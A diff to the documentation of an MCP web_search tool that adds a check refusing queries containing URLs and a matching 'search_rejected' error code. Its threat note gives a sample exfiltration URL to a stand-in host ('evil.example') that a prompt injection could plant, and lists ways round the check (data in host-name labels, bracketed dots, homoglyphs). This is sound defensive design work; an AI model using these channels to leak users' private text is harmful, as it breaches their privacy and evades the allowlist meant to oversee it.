@@ -65,9 +65,10 @@ and diagnostics drop any `user:password@` part of a URL. `socks5h` means
 
 ### `web_search({ query })`
 
-`query` is 1-2000 characters with at least one non-space character. Each call
-sends exactly one `POST {OFOX_BASE_URL}/v1/responses` with
-`Authorization: Bearer <key>` and this body:
+`query` is 1-2000 characters with at least one non-space character, and
+never a URL (below). Each call sends exactly one
+`POST {OFOX_BASE_URL}/v1/responses` with `Authorization: Bearer <key>` and
+this body:
 
 ```json
 {
@@ -81,9 +82,27 @@ sends exactly one `POST {OFOX_BASE_URL}/v1/responses` with
 }
 ```
 
+The instruction asks for one search and a short cited summary, and tells the
+search model never to open or visit any URL that appears in the query.
+
 The request times out after 60 s, and an MCP cancellation aborts it; both
 end as `search_outcome_unknown`. pi-mcp's default request timeout is 30 s,
 so the wrapper should call `web_search` with a longer one (about 70 s).
+
+**No URLs in queries.** The search model opens pages itself (`open_page`
+items), so a query naming a URL would reach that URL past the runtime's
+`web_fetch` allowlist: a prompt injection could send private text out as
+`https://evil.example/c?d=<text>`. A query with any scheme (`\w+://`), a
+`www.` host, or a host name or IPv4 address followed by a path or query
+string (`example.com/…`, `example.com?…`) is refused with `search_rejected`
+before any request. A bare domain and `site:example.com` stay allowed; a
+dotted name before a closing question mark ("Node.js?") is not a query
+string. The runtime refuses the same queries before calling the server.
+Residual risk: text can still leave in a host name's labels
+(`<text>.evil.example`, a bare domain), in an address the check does not read
+as one (`evil[.]example /c`, spaces, homoglyphs), or if the search model opens
+a page despite its instruction; the query itself always reaches the gateway
+and its search provider.
 
 The result has a short summary, up to 25 results (citations first, then the
 search's sources, deduplicated by URL) and usage:
@@ -180,6 +199,7 @@ cut to its limit.
 | `search_unauthorized`         | HTTP 401/403: the key was rejected.                                                                                                                                                                                                              |
 | `search_insufficient_balance` | HTTP 402, or a 4xx (never 429) with Ofox's own error shape `error.type: "insufficient_credits"` or `error.code: 402`. An upstream `insufficient_quota` is not the user's balance.                                                                |
 | `search_failed`               | Another 4xx (with `status`; 429 means rate-limited, try later), or connect()/DNS or the proxy failed before its tunnel (no `status`; nothing was sent). There is no separate rate-limit code: use `status` 429.                                  |
+| `search_rejected`             | The query contains a URL, a `www.` host or a host with a path or query string; nothing was sent.                                                                                                                                                 |
 | `fetch_not_allowed`           | The URL, a DNS answer or a redirect target broke the `web_fetch` rules; for fake-IP DNS, also a failed DNS-over-HTTPS check.                                                                                                                     |
 | `fetch_too_large`             | The page body is over 2 MiB.                                                                                                                                                                                                                     |
 | `fetch_unsupported_content`   | The page is not HTML or plain text.                                                                                                                                                                                                              |
